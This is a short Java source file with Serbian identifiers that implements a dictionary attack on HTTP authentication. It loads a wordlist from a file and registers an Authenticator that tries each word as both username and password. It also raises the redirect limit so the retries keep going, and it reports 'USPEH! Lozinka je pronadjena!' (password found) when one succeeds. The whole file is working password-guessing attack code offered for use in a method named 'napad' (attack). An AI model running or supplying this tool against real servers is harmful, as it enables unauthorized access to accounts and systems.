package paket;

import java.io.BufferedReader;
import java.io.DataInputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.net.Authenticator;
import java.net.PasswordAuthentication;
import java.net.URL;
import java.util.ArrayList;

public class Funkcije
{
    public static ArrayList niz = new ArrayList();
    private static int brojac = -1;
    
    public void ucitajFajl(File file)
    {
        try
        {
            FileInputStream fstream = new FileInputStream(file);
            DataInputStream in = new DataInputStream(fstream);
            BufferedReader br = new BufferedReader(new InputStreamReader(in));
            String strLine;
            
            while ((strLine = br.readLine()) != null)
              niz.add(strLine);
            
            in.close();
        }
        catch (Exception e)
        {
            System.err.println("Greska: " + e.getMessage());
        }
    }

    static class Autentifikacija extends Authenticator
    {
        @Override
        public PasswordAuthentication getPasswordAuthentication()
        {
            brojac += 1;
            System.err.println("Pokusaj za: " + niz.get(brojac).toString());
            return (new PasswordAuthentication(niz.get(brojac).toString(), niz.get(brojac).toString().toCharArray()));
        }
    }

    public void napad(URL url, File fajl) throws Exception
    {
        try
        {
        Funkcije f = new Funkcije();
        f.ucitajFajl(fajl);

        System.setProperty("http.maxRedirects", String.valueOf(niz.size()));
        Authenticator.setDefault(new Autentifikacija());

        InputStream ins = url.openConnection().getInputStream();

        System.out.println("\nUSPEH! Lozinka je pronadjena!");
        }
        catch (java.net.ProtocolException e)
        {
            System.err.println("\nNEUSPEH! Lozinka nije pronadjena...");
        }
    }
}
